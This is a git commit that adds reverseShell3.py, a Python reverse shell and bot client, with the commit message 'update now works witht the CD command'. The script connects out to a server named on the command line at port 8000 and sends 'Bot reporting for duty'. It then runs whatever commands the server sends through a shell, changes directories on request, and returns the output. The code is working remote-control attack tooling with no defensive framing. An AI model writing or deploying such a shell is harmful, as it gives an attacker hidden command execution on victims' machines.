81d03615f86299d61a5a057a05b9cea5eb547d66
hnsengimana <hansnsengimana10@gmail.com>
2022-04-05 13:07:24 -0400

    update now works witht the CD command

---
+++ reverseShell3.py
@@ -0,0 +1,33 @@
+import os
+import sys
+from subprocess import Popen, PIPE
+from socket import *
+
+serverName = sys.argv[1]
+serverPort = 8000
+
+#Create IPv4(AF_INET), TCPSocket(Sock_Stream)
+clientSocket = socket(AF_INET, SOCK_STREAM)
+clientSocket.connect((serverName, serverPort))
+clientSocket.send('Bot reporting for duty'.encode())
+command = clientSocket.recv(4064).decode()
+
+
+while command != "exit": 
+	if command[:2] == "cd":
+		if(os.path.isdir(command[3:]) == 1):
+			os.chdir(command[3:])
+			clientSocket.send("changed directory")
+		else:
+			clientSocket.send("Invalid directory path")
+		command = (clientSocket.recv(4064)).decode()
+	else:
+		proc = Popen(command.split(" "), stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
+		result, err = proc.communicate()
+		if(err != ""):
+			print(err)
+		clientSocket.send(result + err)
+		command = (clientSocket.recv(4064)).decode()
+	
+
+clientSocket.close()
